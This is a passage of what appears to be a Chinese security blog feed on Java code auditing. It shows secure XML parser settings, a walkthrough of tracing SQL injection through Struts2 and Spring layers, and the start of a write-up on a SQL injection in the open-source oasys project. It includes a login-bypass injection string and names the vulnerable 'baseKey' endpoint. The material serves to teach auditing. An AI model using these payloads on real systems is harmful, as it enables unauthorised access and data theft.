code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();<br>dbf.setAttribute(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-keyword">true</span>);<br>dbf.setAttribute(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>dbf.setAttribute(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>dbf.setAttribute(<span class="hljs-string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="hljs-keyword">false</span>);<br>dbf.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, <span class="hljs-keyword">true</span>);<br>dbf.setExpandEntityReferences(<span class="hljs-keyword">false</span>);<br>DocumentBuilder db = dbf.newDocumentBuilder();<br></code></pre></div></td></tr></table></figure><h3 id="javax-xml-stream-XMLInputFactory"><a href="#javax-xml-stream-XMLInputFactory" class="headerlink" title="javax.xml.stream.XMLInputFactory"></a><code>javax.xml.stream.XMLInputFactory</code></h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">XMLInputFactory xif = XMLInputFactory.newInstance();<br>xif.setProperty(XMLInputFactory.SUPPORT_DTD, <span class="hljs-keyword">false</span>);<br>xif.setProperty(<span class="hljs-string">&quot;javax.xml.stream.isSupportingExternalEntities&quot;</span>, <span class="hljs-keyword">false</span>);<br>XMLStreamReader reader = xif.createXMLStreamReader(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(path)));<br>org.jdom.input.SAXBuilder<br>SAXBuilder saxBuilder = <span class="hljs-keyword">new</span> SAXBuilder();<br>saxBuilder.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-keyword">true</span>);<br>saxBuilder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>saxBuilder.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>org.jdom2.Document build = saxBuilder.build(<span class="hljs-keyword">new</span> File(path));<br></code></pre></div></td></tr></table></figure><h3 id="javax-xml-parsers-SAXParser"><a href="#javax-xml-parsers-SAXParser" class="headerlink" title="javax.xml.parsers.SAXParser"></a><code>javax.xml.parsers.SAXParser</code></h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">SAXParserFactory spf =SAXParserFactory.newInstance();<br>spf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-keyword">true</span>);<br>spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>spf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>SAXParser parser =spf.newSAXParser();<br>MyDefaultHandler myHandler = <span class="hljs-keyword">new</span> MyDefaultHandler();<br></code></pre></div></td></tr></table></figure><h3 id="org-xml-sax-XMLReader"><a href="#org-xml-sax-XMLReader" class="headerlink" title="org.xml.sax.XMLReader"></a><code>org.xml.sax.XMLReader</code></h3><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">FileReader  fileReader = <span class="hljs-keyword">new</span> FileReader(path);<br>XMLReader parser = XMLReaderFactory.createXMLReader();<br>parser.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="hljs-keyword">true</span>);<br>parser.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/nonvalidating/load-external-dtd&quot;</span>, <span class="hljs-keyword">false</span>);<br>parser.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br>parser.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="hljs-keyword">false</span>);<br></code></pre></div></td></tr></table></figure><h2 id="xml反序列化写法"><a href="#xml反序列化写法" class="headerlink" title="xml反序列化写法"></a>xml反序列化写法</h2><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">XMLDecoder</span><span class="hljs-params">(String path)</span> </span>&#123;<br><span class="hljs-keyword">try</span> &#123;<br>File file = <span class="hljs-keyword">new</span> File(path);<br>FileInputStream fis = <span class="hljs-keyword">new</span> FileInputStream(file);<br>BufferedInputStream bis = <span class="hljs-keyword">new</span> BufferedInputStream(fis);<br>XMLDecoder xd = <span class="hljs-keyword">new</span> XMLDecoder(bis);<br>xd.readObject();<br>xd.close();<br>&#125; <span class="hljs-keyword">catch</span> (FileNotFoundException e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="业务逻辑漏洞"><a href="#业务逻辑漏洞" class="headerlink" title="业务逻辑漏洞"></a>业务逻辑漏洞</h1><p>走if的时候根据判断status是否等于true来进行流程，比如<code>status/resultCode==0</code>时允许进行下一步<br>示例：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">// 0：成功 1：失败</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;0&quot;</span>.equals(resultCode)) &#123;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h1 id="密码硬编码"><a href="#密码硬编码" class="headerlink" title="密码硬编码"></a>密码硬编码</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">password<br></code></pre></div></td></tr></table></figure><h1 id="springmvc业务逻辑"><a href="#springmvc业务逻辑" class="headerlink" title="springmvc业务逻辑"></a>springmvc业务逻辑</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">*Controller.java<br></code></pre></div></td></tr></table></figure><h1 id="tapestry框架业务逻辑"><a href="#tapestry框架业务逻辑" class="headerlink" title="tapestry框架业务逻辑"></a>tapestry框架业务逻辑</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">extends BusiPage<br></code></pre></div></td></tr></table></figure><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">implemtns<br></code></pre></div></td></tr></table></figure><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">CrossOrigin<br></code></pre></div></td></tr></table></figure><h1 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">.application<br></code></pre></div></td></tr></table></figure><h1 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h1><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">interface</span></span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java审计</tag>
      
      <tag>审计思路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020年代码审计总结</title>
    <link href="/2020/12/24/45/"/>
    <url>/2020/12/24/45/</url>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h1><p>要熟悉java语法，知道啥是类，啥是方法，啥是接口，啥是常量巴拉巴拉巴拉</p><h1 id="2-确定框架"><a href="#2-确定框架" class="headerlink" title="2.确定框架"></a>2.确定框架</h1><p>在打开源码时先判断系统框架，例如一个struts2项目中web.xml文件存在Filter-class为:<br><code>org.apache.struts2.dispatcher.xxxx</code><br><img src="https://novysodope.github.io/images/xianzhi/1.png"><br>以及resources目录（或src（root）目录下）中存在strtus.xml<br><img src="https://novysodope.github.io/images/xianzhi/2.png"><br>如果存在pom那pom.xml中存在struts依赖信息<br><img src="https://novysodope.github.io/images/xianzhi/3.png"><br>而springmvc的特征则是在pom.xml中会存在相关依赖<br><img src="https://novysodope.github.io/images/xianzhi/4.png"><br>web.xml中存在关于DispatcherServlet的注册配置<br><img src="https://novysodope.github.io/images/xianzhi/5.png"></p><h1 id="3-审计思路"><a href="#3-审计思路" class="headerlink" title="3.审计思路"></a>3.审计思路</h1><h2 id="3-1-Struts2"><a href="#3-1-Struts2" class="headerlink" title="3.1.Struts2"></a>3.1.Struts2</h2><h3 id="3-1-1-过滤器及映射配置"><a href="#3-1-1-过滤器及映射配置" class="headerlink" title="3.1.1.过滤器及映射配置"></a>3.1.1.过滤器及映射配置</h3><h4 id="3-1-1-1-Web-xml"><a href="#3-1-1-1-Web-xml" class="headerlink" title="3.1.1.1.Web.xml"></a>3.1.1.1.Web.xml</h4><p>查看web.xml中<code>&lt;filter-mapping&gt;</code>的<code>&lt;url-pattern&gt;</code>来确定拦截规则，当是<code>.action</code>时所有以<code>.action</code>为结尾的请求都会被struts处理拦截，/test/.action则只有test目录下的请求会被拦截。</p><h4 id="3-1-1-2-struts-xml"><a href="#3-1-1-2-struts-xml" class="headerlink" title="3.1.1.2.struts.xml"></a>3.1.1.2.struts.xml</h4><p>通过struts.xml文件,查看存在哪些action,以及处理具体请求的java文件路径<br>例如:</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;action name=<span class="hljs-string">&quot;test&quot;</span> method=<span class="hljs-string">&quot;test&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;novy.action.LoginAction&quot;</span>/&gt;<br></code></pre></div></td></tr></table></figure><p>表示<code>novy.action.LoginAction</code>类中的test方法,处理<code>http://127.0.0.1/test.action</code>的请求。而在另一种的写法中</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">&lt;action name=<span class="hljs-string">&quot;GoLogin&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;com.action.GoLogin&quot;</span>&gt;<br>&lt;result name=&quot;input&quot;&gt;/Login.jsp&lt;/result&gt;<br>&lt;result name=&quot;success&quot;&gt;/Index.jsp&lt;/result&gt;<br>&lt;/action&gt;<br></code></pre></div></td></tr></table></figure><p>表示<code>GoLogin</code>类处理<code>http://127.0.0.1/login.jsp和index.jsp请求</code><br><img src="https://novysodope.github.io/images/xianzhi/6.png"></p><p>还有一种动态方法调用方式请看<a href="https://www.cnblogs.com/zhangzhenzhen/p/5959555.html">https://www.cnblogs.com/zhangzhenzhen/p/5959555.html</a></p><p>在审计漏洞之前，我们需要了解一下web各层流程</p><h3 id="3-1-2-层次介绍"><a href="#3-1-2-层次介绍" class="headerlink" title="3.1.2.层次介绍"></a>3.1.2.层次介绍</h3><p>通常在struts2中<br><strong>action为业务逻辑处理层</strong>，action层接收来自视图层（.jsp（可以理解为前端吧，就是用户看到操作的那层））的请求，并接收请求参数，同时负责调用模型Model层方法来完成业务逻辑的处理，最后控制程序的流程，选择一个合适的视图，将结果显示给用户，一般这个目录下文件的特征表现为xxxxaction.java，比如NovyAction.java；</p><p><strong>dao为数据持久层</strong>，在这层中通常是用来做数据库请求处理的，增删查改都在这里，一般这个目录下文件的特征表现为xxxxDao.java，比如NovyDao.java。</p><p>在web运行处理请求时流程为业务逻辑处理层-数据持久层</p><h3 id="3-1-3-实例"><a href="#3-1-3-实例" class="headerlink" title="3.1.3.实例"></a>3.1.3.实例</h3><p>Idea打开项目，查看目录结构<br><img src="https://novysodope.github.io/images/xianzhi/7.png"><br>从目录得知该框架为struts，web运行处理流程为action-&gt;dao，bean是实体处理，db是数据库连接配置，两者不在流程之中。<br>根据之前**3.1.1.**介绍，我们首先看web.xml文件，查看拦截配置<br>所有.action的请求会被struts2处理，具体实现为StrustPrepareAndExecuteFilter类<br><img src="https://novysodope.github.io/images/xianzhi/8.png"><br>查看struts.xml中映射配置<br><img src="https://novysodope.github.io/images/xianzhi/9.png"><br>根据配置我们知道login.jsp请求由GoLogin类处理，所以我们可以根据路径跟进GoLogin类，其路径组成对应为<br>src（root）/<code>com/action/GoLogin</code>.java<br><img src="https://novysodope.github.io/images/xianzhi/10.png"></p><h4 id="3-1-3-1-代码分析"><a href="#3-1-3-1-代码分析" class="headerlink" title="3.1.3.1.代码分析"></a>3.1.3.1.代码分析</h4><p>在GoLogin类中我们就可以看到一些对登陆的处理，如果我们找登陆处的SQL注入的话就看处理登陆参数的相关方法，比如此处new了一个AdminDao类下的checkLogin方法来处理username及Password，再根据判断返回的结果是否为空来显示相应内容<br><img src="https://novysodope.github.io/images/xianzhi/11.png"><br>根据<strong>3.1.2</strong>介绍我们知道AdminDao为数据持久层，那么ChekLogin方法通常就是对登陆做数据库操作的地方，所以我们跟进一下该方法<br><img src="https://novysodope.github.io/images/xianzhi/12.png"><br>在此处因为直接拼接请求参数，然后带入数据库去执行查询导致了SQL注入漏洞的产生</p><h4 id="3-1-3-2-漏洞验证"><a href="#3-1-3-2-漏洞验证" class="headerlink" title="3.1.3.2.漏洞验证"></a>3.1.3.2.漏洞验证</h4><p>根据前面<strong>3.1.1.2</strong>介绍我们知道其请求路由为login.jsp<br>根据漏洞位置我们模拟其sql语句为</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">select * from Admin <span class="hljs-built_in">where</span> Admin_Username=<span class="hljs-string">&#x27;username&#x27;</span> and Admin_Password=<span class="hljs-string">&#x27;password&#x27;</span><br></code></pre></div></td></tr></table></figure><p>所以登陆时我们可以使用万能用户名来进行登陆绕过<br><code>Admin’or”=”or--+</code><br><img src="https://novysodope.github.io/images/xianzhi/13.png"></p><h2 id="3-2-SpringMVC"><a href="#3-2-SpringMVC" class="headerlink" title="3.2.SpringMVC"></a>3.2.SpringMVC</h2><h3 id="3-2-1-配置及依赖"><a href="#3-2-1-配置及依赖" class="headerlink" title="3.2.1.配置及依赖"></a>3.2.1.配置及依赖</h3><h4 id="3-2-1-1-Web-xml"><a href="#3-2-1-1-Web-xml" class="headerlink" title="3.2.1.1.Web.xml"></a>3.2.1.1.Web.xml</h4><p>通过web.xml中DispatcherServlet配置,来查看springMVC作用范围<br><img src="https://novysodope.github.io/images/xianzhi/14.png"><br>通过servlet中contextConfigLocation配置,查看springMVC配置文件所在路径<br><img src="https://novysodope.github.io/images/xianzhi/15.png"></p><h4 id="3-2-1-2-Springmvc-xml"><a href="#3-2-1-2-Springmvc-xml" class="headerlink" title="3.2.1.2.Springmvc.xml"></a>3.2.1.2.Springmvc.xml</h4><p>在springMVC配置文件中,<code>component-scan</code>是用来查找Controller类所在位置，<code>org.springframework.web.servlet.view.InternalResourceViewResolver</code>为自定义视图解析器<br><img src="https://novysodope.github.io/images/xianzhi/16.png"></p><h4 id="3-2-1-3-pom-xml"><a href="#3-2-1-3-pom-xml" class="headerlink" title="3.2.1.3.pom.xml"></a>3.2.1.3.pom.xml</h4><p>它是Maven项目中的文件，使用XML表示，也可以由此判断该项目是否为maven项目，该配置文件通常用来声明项目信息、环境的配置、引用组件依赖等等<br><img src="https://novysodope.github.io/images/xianzhi/17.png"><br>还是老规矩，在审计漏洞之前，我们先看下spring的请求处理流程</p><h3 id="3-2-2-层次介绍"><a href="#3-2-2-层次介绍" class="headerlink" title="3.2.2.层次介绍"></a>3.2.2.层次介绍</h3><p>通常在springmvc中<br><strong>controller为控制层（业务逻辑）</strong>，用来接收客户端的请求，然后调用Service层业务逻辑，获取到数据，传递数据给视图层（客户端）用于视觉呈现，一般请求的url在这里，比如</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(value = &quot;/novy&quot;)</span> <br></code></pre></div></td></tr></table></figure><p>则请求url为<code>http://localhost/novy</code><br>控制层的文件一般为xxxcontroller.java，比如NovyController.java</p><p><strong>Service是业务层</strong>，接收Controller层数据，与DAO/Mapper层交互，处理业务逻辑，生成responseDTO数据并返回Controller层 ,该层文件一般为xxxServce.java，比如NovyService.java，此处是接口定义，就是定义一些方法，没有这些方法的实现，但是有时候数据操作会在这里发生（看开发）</p><p><strong>Implements是服务实现层（接口实现）</strong>，用来处理一些方法的实现（这个方法干了啥干了啥），该层文件一般为xxxImpl.java，比如NovyImpl.java，impl 是把mapper和service进行整合的文件，有时候一些sql操作也会发生在这里</p><p><strong>Mapper是数据持久层</strong>，对数据库进行数据持久化操作，他的方法语句是直接针对数据库操作的，数据持久层文件通常都是xxxMapper.xml，比如NovyMapper.xml</p><p><strong>Dao是数据接口层</strong>，一些数据请求（接口）会在这里发生（一般用于内部实现）</p><p><strong>Entity是实体处理层</strong>，用于存放我们的实体类，与数据库中的属性值基本保持一致（定义前端传来的请求参数）</p><p>在web运行时处理请求的流程为<code>Controller-&gt;Service-&gt;impl-&gt;mapper</code></p><h3 id="3-2-3-实例"><a href="#3-2-3-实例" class="headerlink" title="3.2.3.实例"></a>3.2.3.实例</h3><p>这里以含有漏洞的springboot项目做案例（springboot和springmvc配置不一样，感兴趣的自行百度，但是请求处理流程一样，这里讲的又不是开发，不影响演示），Idea打开项目，等待依赖导入完成<br><img src="https://novysodope.github.io/images/xianzhi/18.png"><br>发生报错的就自己下载相关组件导入<br>查看目录结构<br><img src="https://novysodope.github.io/images/xianzhi/19.png"><br>按照<strong>3.2.2</strong>介绍得知流程为<strong>controller-&gt;services-&gt;mapper</strong>，按照<strong>3.2.2</strong>对pom的介绍，我们先看pom.xml引用了哪些组件，以此来找出包含漏洞版本的组件，然后再看controller及其他，可以在idea中利用file mask来查看所有controller或全局搜索<code>@Controller</code><br><img src="https://novysodope.github.io/images/xianzhi/20.png"></p><h4 id="3-2-3-1-代码分析"><a href="#3-2-3-1-代码分析" class="headerlink" title="3.2.3.1.代码分析"></a>3.2.3.1.代码分析</h4><p>首先查看引用的组件<br>pom.xml<br><img src="https://novysodope.github.io/images/xianzhi/22.png"><br>看到了两个存在漏洞的组件，拿fastjson反序列化来说，全局搜索json.parseObject或JSONObject.parseObject或<code>@RequestBody</code>来查找参数可控的地方<br><img src="https://novysodope.github.io/images/xianzhi/23.png"><br>在此处中用@RequestBody注解来获取整个请求体，然后对请求体进行反序列化<br><img src="https://novysodope.github.io/images/xianzhi/24.png"><br>按照上面介绍到的搜索并点进一个controller，从<strong>3.2.2</strong>对controller介绍得知此处请求url为<code>/informlistpaging</code><br><img src="https://novysodope.github.io/images/xianzhi/21.png"><br>在此处我们可以看到informListPaging方法定义了很多参数，拿basekey做例子，在该刚方法中被定义为字符串请求参数，按照<strong>3.1.3.1</strong>的思路，我们想要找注入就找到调用方法处理该参数的地方<br><img src="https://novysodope.github.io/images/xianzhi/25.png"><br>在80行中，nm的sortMyNotice方法对几个参数进行处理，这里需要注意的是，nm并不是一个类，而是一个被定义的接口，所以我们需要注意nm在哪里被定义了<br><img src="https://novysodope.github.io/images/xianzhi/26.png"><br>跟进NoticeMapper<br><img src="https://novysodope.github.io/images/xianzhi/27.png"><br>此处为接口，为nm提供了sortMyNotice方法，但这里还不是数据库操作的地方，因为controller无法直接调用mapper.xml的方法（select id），所以就需要这个mapper.java来做一个接口中转，所以我们根据<strong>3.2.2</strong>介绍，转到mapper.xml层<br>全局搜索sortMyNotice方法<br><img src="https://novysodope.github.io/images/xianzhi/28.png"><br>转到notice-mapper.xml<br><img src="https://novysodope.github.io/images/xianzhi/29.png"><br>此处的select id即为调用到的方法，往下为sql语句，我们可以看到在like后面直接用%${}%进行模糊查询，导致了漏洞的产生<br>有人会问service层呢？在这里<br><img src="https://novysodope.github.io/images/xianzhi/31.png"><br>imformRelationService的setList方法对mapper处理返回的数据进行封装处理后返回到controller，然后controller返回到视图层，流程结束<br><img src="https://novysodope.github.io/images/xianzhi/32.png"></p><h4 id="3-2-3-2-漏洞验证"><a href="#3-2-3-2-漏洞验证" class="headerlink" title="3.2.3.2.漏洞验证"></a>3.2.3.2.漏洞验证</h4><p>在<strong>3.2.2</strong>对controller的介绍中得知，根据controller构造url：<br><code>http://localhost/informlistpaging?baseKey=</code><br><img src="https://novysodope.github.io/images/xianzhi/30.png"></p><h2 id="3-3-ps：其他情况"><a href="#3-3-ps：其他情况" class="headerlink" title="3.3.ps：其他情况"></a>3.3.ps：其他情况</h2><h3 id="3-3-1-Sql操作在service层"><a href="#3-3-1-Sql操作在service层" class="headerlink" title="3.3.1.Sql操作在service层"></a>3.3.1.Sql操作在service层</h3><p>有时候sql查询会直接发生在service层，比如<br>某个项目中的某个方法有个查询，定义了一个字符串参数defkey<br><img src="https://novysodope.github.io/images/xianzhi/33.png"><br>查看wfservice在哪里被定义<br><img src="https://novysodope.github.io/images/xianzhi/34.png"><br>跟进WorkFlowService，在该service层中搜索前面调用到的getHavedonePage方法，在该方法中含有一条没有进行预编译的sql查询，此处直接进行带入到数据库查询导致了漏洞的产生<br><img src="https://novysodope.github.io/images/xianzhi/35.png"><br><img src="https://novysodope.github.io/images/xianzhi/36.png"></p><h3 id="3-3-2-跟到接口断了"><a href="#3-3-2-跟到接口断了" class="headerlink" title="3.3.2.跟到接口断了"></a>3.3.2.跟到接口断了</h3><p>当跟进方法时跟到接口断了怎么办，比如出现这种情况<br>controller里有一个密码重置<br><img src="https://novysodope.github.io/images/xianzhi/37.png"><br>跟进updatePassword方法<br><img src="https://novysodope.github.io/images/xianzhi/38.png"><br>到这里之后只看到提供给userService的updatePassword方法，没有看到具体的实现，<br>不要慌，根据<strong>3.2.2</strong>对implements的介绍，我们还有个impl没有看，全局搜索implements UserService<br><img src="https://novysodope.github.io/images/xianzhi/39.png"><br>就可以看到对接口UserService的updatePassword方法的实现<br><img src="https://novysodope.github.io/images/xianzhi/40.png"><br>这时候再继续往下跟就可以了，流程一样</p><h1 id="4-小技巧"><a href="#4-小技巧" class="headerlink" title="4.小技巧"></a>4.小技巧</h1><h2 id="4-1-命名"><a href="#4-1-命名" class="headerlink" title="4.1.命名"></a>4.1.命名</h2><p>无论是struts还是springmvc/boot，按照我的理解，为了方便区分和后续其他开发，除非另类命名（比如<strong>3.1.3</strong>），在整个请求处理流程中对于类名的前置命名都是一致的，比如<br><strong>Novy</strong>Controller-&gt;<strong>NovyService</strong>-&gt;(<strong>NovyService</strong>Impl-&gt;)<strong>Novy</strong>Mapper.xml<br>而不会出现<br><strong>Novy</strong>Controller-&gt;<strong>TestService</strong>-&gt;(<strong>WhyService</strong>Impl-&gt;)<strong>Oasd</strong>Mapper.xml<br>这种情况，所以在审计过程中跟进代码时利用idea的全局搜索能更好的提高审计效率<br><img src="https://novysodope.github.io/images/xianzhi/41.png"></p><h2 id="4-2-方法的跟进"><a href="#4-2-方法的跟进" class="headerlink" title="4.2.方法的跟进"></a>4.2.方法的跟进</h2><p>通常调用方法时都是<code>类名.方法名</code>，或者写了一个EntityManager接口，然后再定义一次:<br><code>private EntityManager em;</code><br>这样em就可以用到EntityManager里的方法<br>比如某个项目有一个序列化工具类SerializeUtil，在该类里有一个deserialize方法来反序列化接收的request数据<br><img src="https://novysodope.github.io/images/xianzhi/42.png"><br>而在controller中定义了一个接口<br><code>private SerializeUtil fvlh;</code><br>然后在某个<code>@PostMapping</code>注解下的方法进行调用<br><code>fvlh.deserialize(request);</code><br>如果我们想找反序列化漏洞就在跟进时可以直接ctrl+左键（idea）来跟进deserialize方法查看具体实现，或者先查看哪里定义了fvlh，然后再根据接口去跟进deserialize方法进行漏洞跟踪,最后确定该漏洞是否利用<br><img src="https://novysodope.github.io/images/xianzhi/43.png"></p><h1 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a>5.其他</h1><p>还有tapestry框架，这个我在公司项目中审的，开源没碰见过，所以不好解释，等哪天碰到了再另说。总的来说跟进思路就这样，其他漏洞同理。感谢shxjia对相关专业知识的解答，感谢白帽100少先队的技术分享</p><p><a href="/images/45/%E5%87%A0%E4%B8%AA%E6%9C%88%E6%9D%A5java%E5%AE%A1%E8%AE%A1%E7%9A%84%E4%B8%80%E7%82%B9%E5%BF%83%E5%BE%97%E6%80%BB%E7%BB%93.docx" title="文档下载地址">文档下载地址（文档比较老，本文章对比文档有改动）</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java审计</tag>
      
      <tag>审计思路</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>oasys前台SQL注入</title>
    <link href="/2020/12/15/44/"/>
    <url>/2020/12/15/44/</url>
    
    <content type="html"><![CDATA[<p><a href="https://gitee.com/aaluoxiang/oa_system">https://gitee.com/aaluoxiang/oa_system</a></p><h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/cn/gson/oasys/controller/inform/InformController.java 68行<br></code></pre></div></td></tr></table></figure><p>有一个<code>informlistpaging</code>方法</p><p><img src="/images/44/1.png"></p><p>在该方法中定义了一个字符串请求参数<code>basekey</code>，用list集合接收了<code>sortMyNotice</code>方法处理<code>basekey</code>等参数的结果，跟进查看哪里定义了<code>nm</code></p><p><img src="/images/44/2.png"></p><p>跟进<code>NoticeMapper</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/java/cn/gson/oasys/mappers/NoticeMapper.java<br></code></pre></div></td></tr></table></figure><p><img src="/images/44/3.png"></p><p>转到mapper层</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">src/main/resources/mappers/notice-mapper.xml<br></code></pre></div></td></tr></table></figure><p>在此数据持久层搜索调用到的selectid</p><p><img src="/images/44/4.png"></p><p><img src="/images/44/5.png"></p><p>在like后面直接用<code>$&#123;%%&#125;</code>进行模糊查询，导致了漏洞的产生</p><p>漏洞验证<br>根据controller的路由构造url：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">http://localhost/informlistpaging?baseKey=<br></code></pre></div></td></tr></table></figure><p>创建一个普通职工账号 test test</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs 